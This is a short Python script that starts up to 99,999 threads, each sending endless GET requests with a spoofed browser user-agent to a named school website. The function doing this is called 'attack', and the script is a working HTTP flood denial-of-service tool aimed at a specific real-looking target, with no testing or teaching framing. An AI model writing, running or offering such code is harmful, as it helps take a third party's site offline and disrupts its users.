import threading
import requests
adsw = 'https://www.yy2.edu.hk/'
data = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        }
def attack(url,header):
    while 1:
        requests.get(url,headers=header)
        print('1')
def loop():
    for i in range(99999):
        haha = threading.Thread(target=attack,args=(adsw,data))
        haha.start()
loop()